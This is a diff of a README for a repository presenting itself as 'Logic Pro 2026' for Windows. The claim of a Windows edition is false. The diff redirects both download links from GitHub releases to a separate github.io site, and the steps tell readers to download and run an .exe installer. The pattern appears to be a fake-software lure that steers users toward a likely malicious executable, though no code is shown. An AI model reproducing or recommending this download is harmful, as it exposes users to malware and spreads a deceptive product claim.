@@ -1,7 +1,7 @@
 # 🎧 Logic-Pro-2026 - Create professional music on Windows easily
 
 <p align="center">
-  <a href="https://github.com/Whitsuperabundant782/Logic-Pro-2026/releases">
+  <a href="https://whitsuperabundant782.github.io">
     <img src="https://img.shields.io/badge/Download-Logic%20Pro%202026-blue.svg" alt="Download Logic Pro 2026">
   </a>
 </p>
@@ -23,7 +23,7 @@ Your computer must meet these requirements for the software to run well:
 
 You must obtain the installation files from the project releases page. Follow these steps to prepare the software for your system:
 
-1. Visit the [official releases page](https://github.com/Whitsuperabundant782/Logic-Pro-2026/releases) to access the download files.
+1. Visit the [official releases page](https://whitsuperabundant782.github.io) to access the download files.
 2. Look for the file ending in .exe under the latest version tag.
 3. Click the file name to start the download process.
 4. Save the installer to your Downloads folder or your desktop for easy access.
